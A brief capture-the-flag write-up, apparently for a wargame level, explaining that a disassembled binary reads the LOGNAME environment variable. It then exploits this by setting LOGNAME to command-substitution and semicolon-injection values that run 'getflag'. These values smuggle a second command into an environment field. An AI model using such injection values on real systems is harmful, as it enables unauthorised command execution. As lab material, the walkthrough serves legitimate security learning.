by dissambling (using hooper here) we notice that there's a getenv("LOGNAME")
we can assume that the binary use the LOGNAME Value in env to print
we can exploit this to launch the getflag
by changing Logname by export LOGNAME=\`getflag\`

you can exploit the binary

export LOGNAME=\`getflag\`
alternative
export LOGNAME=";getflag"
